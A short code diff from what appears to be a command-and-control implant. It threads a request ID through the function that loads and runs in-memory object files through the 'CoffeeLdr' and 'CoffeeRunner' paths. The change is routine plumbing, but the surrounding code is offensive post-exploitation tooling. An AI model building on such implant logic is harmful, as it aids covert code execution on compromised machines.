@@ -1061,6 +1061,7 @@ VOID CommandInlineExecute( PPARSER Parser )
     UINT32    ArgSize          = 0;
     PCHAR     ObjectData       = NULL;
     PMEM_FILE MemFile          = NULL;
+    UINT32    RequestID        = Instance.CurrentRequestID;
     PCHAR     FunctionName     = ParserGetString( Parser, &FunctionNameSize );
     ULONG     MemFileID        = ParserGetInt32( Parser );
     PCHAR     ArgBuffer        = ParserGetString( Parser, &ArgSize );
@@ -1086,14 +1087,14 @@ VOID CommandInlineExecute( PPARSER Parser )
         case 0:
         {
             PUTS( "Use Non-Threaded CoffeeLdr" )
-            CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
+            CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize, RequestID );
             break;
         }
 
         case 1:
         {
             PUTS( "Use Threaded CoffeeRunner" )
-            CoffeeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize );
+            CoffeeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize, RequestID );
             break;
         }
 
@@ -1104,12 +1105,12 @@ VOID CommandInlineExecute( PPARSER Parser )
             if ( Instance.Config.Implant.CoffeeThreaded )
             {
                 PUTS( "Config is set to threaded" )
-                CoffeeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize );
+                CoffeeRunner( FunctionName, FunctionNameSize, ObjectData, ObjectDataSize, ArgBuffer, ArgSize, RequestID );
             }
             else
             {
                 PUTS( "Config is set to non-threaded" )
-                CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
+                CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize, RequestID );
             }
 
             break;
